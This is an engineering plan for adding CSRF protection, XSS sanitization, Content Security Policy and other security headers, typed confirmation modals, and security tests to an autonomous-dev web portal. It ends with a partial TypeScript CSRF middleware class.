# PLAN-014-2: CSRF Defense + XSS Sanitization Pipeline + Security Headers

## Metadata
- **Parent TDD**: TDD-014-portal-security-auth
- **Estimated effort**: 3-4 days
- **Dependencies**: ["PLAN-013-2", "PLAN-014-1"]
- **Blocked by**: []
- **Priority**: P0

## Objective

Deliver comprehensive security hardening for the autonomous-dev portal including CSRF protection, XSS sanitization, security headers, and typed confirmation flows. This plan implements defense-in-depth against cross-site scripting, cross-site request forgery, and clickjacking attacks while maintaining a seamless user experience for legitimate operations.

## Scope

### In Scope

1. **CSRF Defense Layer**
   - Origin header validation on state-changing requests (POST/PUT/DELETE/PATCH)
   - Per-session CSRF token generation with cryptographic randomness
   - Double-submit cookie pattern with secure/httpOnly flags
   - Token TTL enforcement with configurable expiration (default 24h)
   - Timing-safe token comparison to prevent timing attacks
   - HTMX integration via `hx-headers` attribute for seamless SPA experience
   - Graceful degradation for non-HTMX requests

2. **Typed CONFIRM Modal System**
   - Server-side one-time confirmation token system
   - In-memory session-keyed token storage with 60-second TTL
   - Modal UX flow requiring user to type exact confirmation phrase
   - Applied to destructive operations: kill-switch activation, circuit-breaker reset, allowlist removal, trust level reduction
   - Token invalidation after use or expiration
   - Rate limiting on confirmation token generation

3. **Content Security Policy (CSP)**
   - Strict CSP header: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`
   - Nonce-based script execution for critical inline scripts
   - CSP violation reporting endpoint
   - Progressive enhancement for CSP-compliant browsers

4. **Additional Security Headers**
   - `X-Content-Type-Options: nosniff` - MIME type enforcement
   - `X-Frame-Options: DENY` - Clickjacking protection
   - `Referrer-Policy: same-origin` - Referrer leakage prevention
   - `X-XSS-Protection: 1; mode=block` - Legacy XSS filter activation
   - `Strict-Transport-Security` - HTTPS enforcement (production only)

5. **Markdown Sanitization Pipeline**
   - Integration of marked v5.1.x for markdown parsing
   - DOMPurify v3.x with strict HTML5 profile for sanitization
   - Allowlist-based approach: only safe tags/attributes permitted
   - Code diffs rendered as HTML-entity-encoded text only
   - Zero tolerance for `innerHTML` usage anywhere in codebase
   - Fallback refusal pattern when sanitization fails

6. **Security Response Patterns**
   - HTMX-aware error responses (JSON 403 for AJAX, error page for standard requests)
   - Consistent error messaging without information leakage
   - Security event logging for monitoring/alerting
   - Rate limiting integration for attack mitigation

### Out of Scope

- Authentication modes and session management (handled by PLAN-014-1)
- Audit log integrity and tamper-proofing (deferred to PLAN-014-3)
- Path traversal validation and file access controls (PLAN-014-3)
- Database security and injection prevention (PLAN-015-*)
- Live data layer security considerations (PLAN-015-*)
- Client-side cryptographic operations
- Advanced bot detection and behavioral analysis
- Network-level security (TLS configuration, load balancer settings)

## Tasks

### TASK-001: CSRF Token Infrastructure
**Dependencies**: []  
**Track**: Core Security  
**Estimated Effort**: 4 hours

**Description**: Implement cryptographically secure CSRF token generation, storage, and validation infrastructure. Create middleware that generates per-session tokens with configurable TTL and validates them using timing-safe comparison.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/csrf-protection.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/types.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/crypto-utils.ts`

**Acceptance Criteria**:
- Token generation uses crypto.randomBytes(32) for cryptographic security
- Tokens stored in session storage with automatic cleanup on expiration
- Timing-safe comparison prevents timing attack vectors
- Token TTL configurable via environment variables (default 24h)
- Double-submit cookie pattern with secure/httpOnly flags
- Comprehensive logging for token lifecycle events

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/
npm test -- --testPathPattern=csrf-protection
```

**Risks**:
- **Medium**: Node.js crypto module behavior differs between versions
  - *Mitigation*: Pin Node.js version in package.json engines field
- **Low**: Session storage memory consumption with high token volume
  - *Mitigation*: Implement LRU eviction and monitor memory usage

---

### TASK-002: Origin Header Validation Middleware
**Dependencies**: [TASK-001]  
**Track**: Core Security  
**Estimated Effort**: 2 hours

**Description**: Create Express middleware that validates Origin header on all state-changing HTTP methods. Implement strict origin checking against configured allowed origins with fallback to Referer header validation.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/origin-validation.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/config/security-config.ts`

**Acceptance Criteria**:
- Validates Origin header on POST/PUT/DELETE/PATCH requests
- Falls back to Referer header if Origin is missing
- Configurable allowlist of valid origins (supports wildcards for dev)
- Rejects requests with mismatched or missing origin/referer
- Logs all origin validation failures for security monitoring
- Performance optimized with origin caching

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/origin-validation.ts
npm test -- --testPathPattern=origin-validation
```

**Risks**:
- **Low**: Browser differences in Origin header behavior
  - *Mitigation*: Test across major browsers, maintain compatibility matrix
- **Medium**: Proxy/CDN configuration may strip Origin headers
  - *Mitigation*: Document proxy requirements, add X-Forwarded-Host support

---

### TASK-003: CSRF Middleware Integration
**Dependencies**: [TASK-001, TASK-002]  
**Track**: Core Security  
**Estimated Effort**: 3 hours

**Description**: Integrate CSRF token validation into Express middleware stack. Create middleware that checks tokens on state-changing requests and generates appropriate error responses for HTMX and standard browser requests.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/middleware/csrf-middleware.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/middleware/security-middleware.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/routes/middleware-registration.ts`

**Acceptance Criteria**:
- Middleware validates CSRF tokens on protected routes
- Skips validation for safe methods (GET, HEAD, OPTIONS)
- Returns JSON error response for HTMX requests (HX-Request header present)
- Returns rendered error page for standard browser requests
- Integrates with existing authentication middleware
- Configurable routes exclusion list for public APIs

**Lint/Test Commands**:
```bash
npm run lint src/portal/middleware/
npm test -- --testPathPattern=csrf-middleware
```

**Risks**:
- **High**: HTMX detection may fail with custom headers
  - *Mitigation*: Multiple detection methods, fallback to user-agent analysis
- **Medium**: Performance impact on high-traffic endpoints
  - *Mitigation*: Token caching, async validation where possible

---

### TASK-004: HTMX CSRF Integration
**Dependencies**: [TASK-003]  
**Track**: Frontend Integration  
**Estimated Effort**: 3 hours

**Description**: Integrate CSRF tokens with HTMX requests using `hx-headers` attribute. Create JavaScript utilities that automatically include tokens in AJAX requests and handle CSRF errors gracefully.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/public/js/csrf-integration.js`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/views/layouts/base.hbs`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/helpers/csrf-helpers.ts`

**Acceptance Criteria**:
- CSRF tokens automatically included in all HTMX requests
- Token refresh mechanism for long-lived pages
- Error handling for CSRF validation failures
- Progressive enhancement for non-JavaScript browsers
- Integration with existing HTMX configuration
- User-friendly error messages without security information leakage

**Lint/Test Commands**:
```bash
npm run lint src/portal/public/js/
npm test -- --testPathPattern=csrf-integration
```

**Risks**:
- **Medium**: JavaScript errors may break CSRF protection
  - *Mitigation*: Extensive error handling, fallback to form-based submission
- **Low**: Token synchronization issues with multiple tabs
  - *Mitigation*: Server-side validation only, client tokens are references

---

### TASK-005: Typed CONFIRM Modal System
**Dependencies**: []  
**Track**: UI Security  
**Estimated Effort**: 5 hours

**Description**: Implement server-side one-time confirmation token system with modal UI requiring users to type exact confirmation phrases. Apply to destructive operations with 60-second token TTL and session-based storage.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/confirmation-tokens.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/components/confirm-modal.hbs`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/public/js/confirm-modal.js`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/routes/confirmation-routes.ts`

**Acceptance Criteria**:
- One-time tokens generated with crypto.randomBytes(16)
- In-memory storage keyed by session ID with automatic cleanup
- Modal requires exact phrase typing (case-sensitive)
- Tokens expire after 60 seconds automatically
- Applied to: kill-switch, circuit-breaker reset, allowlist removal, trust level reduction
- Rate limiting: max 3 tokens per session per minute
- Progressive enhancement for keyboard navigation

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/confirmation-tokens.ts
npm test -- --testPathPattern=confirmation-tokens
npm run test:e2e -- --grep "typed confirmation"
```

**Risks**:
- **High**: Memory consumption with many concurrent sessions
  - *Mitigation*: LRU cache with size limits, session cleanup on logout
- **Medium**: Race conditions between token generation and validation
  - *Mitigation*: Atomic operations, proper locking mechanisms

---

### TASK-006: Content Security Policy Implementation
**Dependencies**: []  
**Track**: Headers Security  
**Estimated Effort**: 3 hours

**Description**: Implement strict Content Security Policy headers with violation reporting. Create middleware that sets CSP headers and handles violation reports for monitoring and alerting.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/csp-middleware.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/csp-config.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/routes/csp-violation-report.ts`

**Acceptance Criteria**:
- CSP header: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`
- Nonce generation for critical inline scripts
- Violation reporting endpoint at `/csp-violation-report`
- Environment-based CSP policies (strict for production)
- Graceful degradation for non-CSP browsers
- Comprehensive violation logging and alerting

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/csp-middleware.ts
npm test -- --testPathPattern=csp-middleware
npm run test:security -- --grep "CSP"
```

**Risks**:
- **High**: Overly strict CSP may break existing functionality
  - *Mitigation*: Gradual rollout, report-only mode first, extensive testing
- **Medium**: Browser compatibility issues with CSP v3 features
  - *Mitigation*: Progressive enhancement, fallback policies

---

### TASK-007: Additional Security Headers
**Dependencies**: [TASK-006]  
**Track**: Headers Security  
**Estimated Effort**: 2 hours

**Description**: Implement comprehensive security headers middleware including X-Content-Type-Options, X-Frame-Options, Referrer-Policy, and environment-specific HSTS configuration.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/security-headers.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/config/header-config.ts`

**Acceptance Criteria**:
- X-Content-Type-Options: nosniff (MIME type enforcement)
- X-Frame-Options: DENY (clickjacking protection)
- Referrer-Policy: same-origin (referrer leakage prevention)
- X-XSS-Protection: 1; mode=block (legacy XSS filter)
- Strict-Transport-Security in production only (1 year max-age)
- Environment-aware header configuration
- Header validation and sanitization

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/security-headers.ts
npm test -- --testPathPattern=security-headers
```

**Risks**:
- **Low**: HSTS may cause issues in development environments
  - *Mitigation*: Environment detection, localhost exclusion
- **Medium**: Legacy browser compatibility with newer headers
  - *Mitigation*: Progressive enhancement, compatibility testing

---

### TASK-008: Markdown Sanitization Pipeline
**Dependencies**: []  
**Track**: Content Security  
**Estimated Effort**: 6 hours

**Description**: Integrate marked v5.1.x and DOMPurify v3.x to create a secure markdown processing pipeline. Implement strict HTML5 sanitization with allowlist-based approach and entity encoding for code content.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/sanitization-pipeline.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/sanitization-config.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/helpers/markdown-helpers.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/package.json`

**Acceptance Criteria**:
- marked v5.1.x integration with security-focused configuration
- DOMPurify v3.x with strict HTML5 profile
- Allowlist approach: only safe tags/attributes permitted
- Code diffs rendered as HTML-entity-encoded text only
- Zero innerHTML usage anywhere in codebase (enforced by ESLint rule)
- Fallback refusal pattern when sanitization fails
- Performance optimized with result caching

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/sanitization-pipeline.ts
npm test -- --testPathPattern=sanitization-pipeline
npm run test:xss -- --grep "sanitization"
```

**Risks**:
- **High**: DOMPurify bypass vulnerabilities in future versions
  - *Mitigation*: Pin exact versions, subscribe to security advisories, regular updates
- **Medium**: Performance impact on large markdown documents
  - *Mitigation*: Async processing, result caching, size limits

---

### TASK-009: Code Diff Security Renderer
**Dependencies**: [TASK-008]  
**Track**: Content Security  
**Estimated Effort**: 4 hours

**Description**: Create secure code diff renderer that uses HTML entity encoding exclusively. Implement syntax highlighting through CSS classes only, avoiding any innerHTML or dynamic script execution.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/secure-diff-renderer.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/public/css/secure-syntax-highlighting.css`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/helpers/diff-helpers.ts`

**Acceptance Criteria**:
- All code content HTML-entity-encoded before rendering
- Syntax highlighting via CSS classes only (no JavaScript execution)
- Diff visualization with secure line numbering
- Support for common programming languages
- XSS-proof even with malicious code content
- Accessible to screen readers and keyboard navigation
- Performance optimized for large diffs

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/secure-diff-renderer.ts
npm test -- --testPathPattern=secure-diff-renderer
npm run test:xss -- --grep "code diff"
```

**Risks**:
- **Medium**: Complex regex patterns may introduce ReDoS vulnerabilities
  - *Mitigation*: Use proven libraries, avoid complex custom regex, timeout limits
- **Low**: CSS-based highlighting may be insufficient for complex languages
  - *Mitigation*: Gradual enhancement, fallback to plain text, user configuration

---

### TASK-010: HTMX Security Response Handler
**Dependencies**: [TASK-003, TASK-004]  
**Track**: Frontend Integration  
**Estimated Effort**: 3 hours

**Description**: Create HTMX-aware security response system that returns appropriate JSON or HTML responses based on request type. Implement consistent error messaging without information leakage.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/middleware/htmx-security-responses.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/views/errors/security-error.hbs`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/helpers/error-helpers.ts`

**Acceptance Criteria**:
- Detects HTMX requests via HX-Request header
- Returns JSON 403 for AJAX/HTMX requests with error details
- Returns rendered error page for standard browser requests
- Consistent error messaging without security information leakage
- Integration with existing error handling middleware
- Proper HTTP status codes for different security violations
- Security event logging for monitoring

**Lint/Test Commands**:
```bash
npm run lint src/portal/middleware/htmx-security-responses.ts
npm test -- --testPathPattern=htmx-security-responses
```

**Risks**:
- **Medium**: HTMX detection may fail with proxy modifications
  - *Mitigation*: Multiple detection methods, user-agent fallback
- **Low**: Error message standardization may conflict with existing patterns
  - *Mitigation*: Coordinate with existing error handling, gradual migration

---

### TASK-011: Security Event Logging
**Dependencies**: []  
**Track**: Monitoring  
**Estimated Effort**: 3 hours

**Description**: Implement comprehensive security event logging system with structured formats for monitoring and alerting. Create log aggregation for security incidents and attack pattern detection.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/security-logger.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/event-types.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/config/logging-config.ts`

**Acceptance Criteria**:
- Structured JSON logging for all security events
- Event types: CSRF violations, XSS attempts, CSP violations, origin mismatches
- Log levels with appropriate severity (INFO, WARN, ERROR, CRITICAL)
- Request correlation IDs for incident investigation
- Rate limiting to prevent log flooding attacks
- Integration with existing logging infrastructure
- Privacy-safe logging (no sensitive data exposure)

**Lint/Test Commands**:
```bash
npm run lint src/portal/security/security-logger.ts
npm test -- --testPathPattern=security-logger
```

**Risks**:
- **Medium**: High attack volume may flood logs and impact performance
  - *Mitigation*: Rate limiting, async logging, log rotation
- **Low**: Sensitive data may accidentally be logged
  - *Mitigation*: Data sanitization, automated sensitive data detection

---

### TASK-012: Security Configuration Management
**Dependencies**: [TASK-001, TASK-006, TASK-007]  
**Track**: Configuration  
**Estimated Effort**: 2 hours

**Description**: Create centralized security configuration system with environment-specific settings and validation. Implement configuration hot-reloading and validation schemas.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/config/security-config.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/config/config-validator.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/config/security-defaults.json`

**Acceptance Criteria**:
- Centralized configuration for all security settings
- Environment-specific overrides (development vs production)
- Configuration validation with detailed error messages
- Hot-reloading capability without service restart
- Schema validation for all security configurations
- Secure defaults with explicit opt-in for relaxed settings
- Documentation for all configuration options

**Lint/Test Commands**:
```bash
npm run lint src/portal/config/
npm test -- --testPathPattern=config
```

**Risks**:
- **Low**: Configuration hot-reloading may introduce security gaps
  - *Mitigation*: Atomic updates, validation before application, rollback capability
- **Medium**: Complex configuration may lead to misconfigurations
  - *Mitigation*: Secure defaults, extensive validation, clear documentation

---

### TASK-013: XSS Attack Vector Testing
**Dependencies**: [TASK-008, TASK-009]  
**Track**: Testing  
**Estimated Effort**: 8 hours

**Description**: Create comprehensive test suite covering 50+ XSS payload scenarios including OWASP Top 10 attack vectors. Implement automated security regression testing with known-malicious content.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/xss-payload-tests.spec.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/xss-payloads.json`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/security-regression.spec.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/helpers/attack-vectors.ts`

**Acceptance Criteria**:
- 50+ XSS payload tests including OWASP cheat sheet examples
- Coverage: script tags, javascript: URLs, on* event attributes, SVG payloads, CSS injection
- Automated testing in CI/CD pipeline
- Security regression prevention with historical attack vectors
- Performance testing with large payloads
- False positive detection and handling
- Comprehensive documentation of covered attack vectors

**Lint/Test Commands**:
```bash
npm run test:security -- --grep "XSS"
npm run test:regression -- --grep "security"
npm run lint tests/security/
```

**Risks**:
- **High**: Test payloads may trigger security scanners or monitoring
  - *Mitigation*: Clear documentation, test environment isolation, scanner exemptions
- **Medium**: New attack vectors may not be covered by existing tests
  - *Mitigation*: Regular payload updates, security research monitoring, community contributions

---

### TASK-014: CSRF Rejection Testing
**Dependencies**: [TASK-003, TASK-004]  
**Track**: Testing  
**Estimated Effort**: 4 hours

**Description**: Create comprehensive CSRF attack simulation tests covering missing tokens, mismatched origins, expired tokens, and timing attack scenarios. Verify protection effectiveness across all attack vectors.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/csrf-attack-tests.spec.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/csrf-scenarios.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/helpers/attack-simulation.ts`

**Acceptance Criteria**:
- Missing CSRF token rejection tests
- Invalid token format rejection tests
- Expired token rejection tests
- Origin mismatch rejection tests
- Timing attack resistance verification
- Double-submit cookie validation tests
- HTMX integration security tests
- Performance impact measurement under attack conditions

**Lint/Test Commands**:
```bash
npm run test:security -- --grep "CSRF"
npm run test:performance -- --grep "csrf attack simulation"
```

**Risks**:
- **Medium**: Timing attack tests may be unreliable in CI environments
  - *Mitigation*: Statistical analysis over multiple runs, environment-aware thresholds
- **Low**: Attack simulation may impact other running tests
  - *Mitigation*: Isolated test environment, proper cleanup, parallel execution limits

---

### TASK-015: CSP Violation Testing
**Dependencies**: [TASK-006]  
**Track**: Testing  
**Estimated Effort**: 3 hours

**Description**: Create automated testing for CSP enforcement including inline script blocking, external script rejection, eval() prevention, and violation reporting functionality.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/csp-enforcement-tests.spec.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/security/csp-violation-scenarios.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/helpers/browser-automation.ts`

**Acceptance Criteria**:
- Inline script execution blocking verification
- External script loading rejection tests
- eval() and Function() constructor blocking
- Object/embed tag rejection tests
- Frame-ancestors policy enforcement
- Violation report generation and handling
- Browser compatibility testing across major browsers
- Performance impact measurement

**Lint/Test Commands**:
```bash
npm run test:security -- --grep "CSP"
npm run test:browser -- --grep "csp enforcement"
```

**Risks**:
- **High**: Browser behavior differences may cause test flakiness
  - *Mitigation*: Browser-specific test configurations, retry mechanisms, known issue documentation
- **Medium**: CSP testing requires real browser environment
  - *Mitigation*: Headless browser integration, CI environment optimization

---

### TASK-016: Security Integration Testing
**Dependencies**: [TASK-010, TASK-011, TASK-012]  
**Track**: Integration  
**Estimated Effort**: 4 hours

**Description**: Create end-to-end security integration tests covering complete attack scenarios across multiple security layers. Verify defense-in-depth effectiveness and proper error handling.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/integration/security-integration.spec.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/integration/attack-scenarios.ts`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/tests/helpers/security-test-helpers.ts`

**Acceptance Criteria**:
- Multi-layer attack scenario testing (CSRF + XSS + CSP bypass attempts)
- Error handling consistency across security layers
- Logging integration verification
- Performance under sustained attack simulation
- Recovery after attack mitigation
- User experience during security incidents
- Administrative interface security validation

**Lint/Test Commands**:
```bash
npm run test:integration -- --grep "security"
npm run test:e2e -- --grep "attack scenarios"
```

**Risks**:
- **High**: Integration tests may be complex and brittle
  - *Mitigation*: Modular test design, robust setup/teardown, clear failure diagnostics
- **Medium**: Attack simulation may trigger real security monitoring
  - *Mitigation*: Test environment isolation, monitoring exemptions, clear test identification

---

### TASK-017: Security Documentation and Runbook
**Dependencies**: [ALL_PREVIOUS_TASKS]  
**Track**: Documentation  
**Estimated Effort**: 3 hours

**Description**: Create comprehensive security documentation including configuration guide, incident response runbook, and security monitoring setup instructions.

**Files**:
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/docs/security/security-configuration.md`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/docs/security/incident-response.md`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/docs/security/attack-mitigation.md`
- `/Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/docs/security/security-testing.md`

**Acceptance Criteria**:
- Complete configuration documentation with examples
- Incident response procedures with escalation paths
- Attack mitigation strategies for each threat type
- Security monitoring setup and alerting configuration
- Troubleshooting guide for common security issues
- Security testing procedures and automation setup
- Regular security maintenance checklist

**Lint/Test Commands**:
```bash
npm run lint:docs docs/security/
npm run test:docs -- --grep "security docs"
```

**Risks**:
- **Low**: Documentation may become outdated as code evolves
  - *Mitigation*: Automated documentation testing, CI integration, regular review schedule
- **Medium**: Security procedures may be incomplete or incorrect
  - *Mitigation*: Security expert review, incident simulation exercises, iterative improvement

## Dependency Graph

```
Critical Path: TASK-001 → TASK-002 → TASK-003 → TASK-004 → TASK-010 → TASK-017 (18 hours)

TASK-001 (CSRF Infrastructure) [4h]
    ↓
TASK-002 (Origin Validation) [2h]
    ↓
TASK-003 (CSRF Middleware) [3h]
    ↓
TASK-004 (HTMX CSRF) [3h]
    ↓
TASK-010 (HTMX Responses) [3h]

TASK-005 (Typed CONFIRM) [5h] (parallel)

TASK-006 (CSP Implementation) [3h] (parallel)
    ↓
TASK-007 (Security Headers) [2h]

TASK-008 (Sanitization Pipeline) [6h] (parallel)
    ↓
TASK-009 (Secure Diff Renderer) [4h]

TASK-011 (Security Logging) [3h] (parallel)
TASK-012 (Configuration) [2h] (parallel)

Testing Track (after core implementation):
TASK-013 (XSS Testing) [8h]
TASK-014 (CSRF Testing) [4h] 
TASK-015 (CSP Testing) [3h]
TASK-016 (Integration Testing) [4h]

TASK-017 (Documentation) [3h] (depends on all)
```

## Parallel Execution Schedule

### Track 1: Core Security (Critical Path)
- **Week 1 Day 1**: TASK-001 (CSRF Infrastructure) - 4h
- **Week 1 Day 1**: TASK-002 (Origin Validation) - 2h
- **Week 1 Day 2**: TASK-003 (CSRF Middleware) - 3h
- **Week 1 Day 2**: TASK-004 (HTMX CSRF) - 3h
- **Week 1 Day 3**: TASK-010 (HTMX Responses) - 3h

### Track 2: UI Security  
- **Week 1 Day 1**: TASK-005 (Typed CONFIRM) - 5h
- **Week 1 Day 2**: TASK-011 (Security Logging) - 3h

### Track 3: Headers Security
- **Week 1 Day 1**: TASK-006 (CSP Implementation) - 3h
- **Week 1 Day 1**: TASK-007 (Security Headers) - 2h  
- **Week 1 Day 2**: TASK-012 (Configuration) - 2h

### Track 4: Content Security
- **Week 1 Day 1**: TASK-008 (Sanitization Pipeline) - 6h
- **Week 1 Day 2**: TASK-009 (Secure Diff Renderer) - 4h

### Track 5: Testing (Week 2)
- **Week 2 Day 1**: TASK-013 (XSS Testing) - 8h
- **Week 2 Day 2**: TASK-014 (CSRF Testing) + TASK-015 (CSP Testing) - 7h
- **Week 2 Day 3**: TASK-016 (Integration Testing) + TASK-017 (Documentation) - 7h

## Detailed Implementation Code

### CSRF Protection Middleware (Core Component)

```typescript
// /Users/pwatson/codebase/space.pwatson/claude-code-homelab/plugins/autonomous-dev/src/portal/security/csrf-protection.ts

import { Request, Response, NextFunction } from 'express';
import { randomBytes, timingSafeEqual } from 'crypto';
import { promisify } from 'util';

interface CSRFConfig {
  tokenTTL: number; // milliseconds
  cookieName: string;
  headerName: string;
  excludePaths: string[];
  secretKey: string;
}

interface CSRFToken {
  value: string;
  createdAt: number;
  sessionId: string;
}

interface CSRFRequestExtension {
  csrfToken?: string;
  isCSRFValid?: boolean;
}

declare global {
  namespace Express {
    interface Request extends CSRFRequestExtension {}
  }
}

export class CSRFProtection {
  private tokenStore = new Map<string, CSRFToken>();
  private cleanupInterval: NodeJS.Timeout;

  constructor(private config: CSRFConfig) {
    // Cleanup expired tokens every 5 minutes
    this.cleanupInterval = setInterval(() => {
      this.cleanupExpiredTokens();
    }, 5 * 60 * 1000);
  }

  /**
   * Generate cryptographically secure CSRF token
   */
  private generateToken(): string {
    return randomBytes(32).toString('hex');
  }

  /**
   * Create HMAC signature for token integrity
   */
  private signToken(token: string, sessionId: string): string {
    const crypto = require('crypto');
    const hmac = crypto.createHmac('sha256', this.config.secretKey);
    hmac.update(`${token}:${sessionId}`);
    return hmac.digest('hex');
  }

  /**
   * Verify token signature
   */
  private verifyTokenSignature(token: string, signature: string, sessionId: string): boolean {
    const expectedSignature = this.signToken(token, sessionId);
    
    // Timing-safe comparison to prevent timing attacks
    if (signature.length !== expectedSignature.length) {
      return false;
    }
    
    const signatureBuffer = Buffer.from(signature, 'hex');
    const expectedBuffer = Buffer.from(expectedSignature, 'hex');
    
    return timingSafeEqual(signatureBuffer, expectedBuffer);
  }

  /**
   * Generate new CSRF token for session
   */
  public generateTokenForSession(sessionId: string): { token: string; signature: string } {
    const token = this.generateToken();
    const signature = this.signToken(token, sessionId);
    
    // Store token with metadata
    this.tokenStore.set(token, {
      value: token,
      createdAt: Date.now(),
      sessionId
    });

    return { token, signature };
  }

  /**
   * Validate CSRF token
   */
  public validateToken(token: string, signature: string, sessionId: string): boolean {
    // Check if token exists in store
    const storedToken = this.tokenStore.get(token);
    if (!storedToken) {
      return false;
    }

    // Verify token belongs to session
    if (storedToken.sessionId !== sessionId) {
      return false;
    }

    // Check token expiration
    if (Date.now() - storedToken.createdAt > this.config.tokenTTL) {
      this.tokenStore.delete(token);
      return false;
    }

    // Verify signature
    if (!this.verifyTokenSignature(token, signature, sessionId)) {
      return false;
    }

    return true;
  }

  /**
   * Remove token after use (one-time use for sensitive operations)
   */
  public invalidateToken(token: string): void {
    this.tokenStore.delete(token);
  }

  /**
   * Cleanup expired tokens
   */
  private cleanupExpiredTokens(): void {
    const now = Date.now();
    for (const [token, data] of this.tokenStore.entries()) {
      if (now - data.createdAt > this.config.tokenTTL) {
        this.tokenStore.delete(token);
      }
    }
  }

  /**
   * Express middleware for CSRF protection
   */
  public middleware() {
    return (req: Request, res: Response, next: NextFunction): void => {
      const method = req.method.toUpperCase();
      const path = req.path;

      // Skip CSRF check for safe methods
      if (['GET', 'HEAD', 'OPTIONS'].includes(method)) {
        return next();
      }

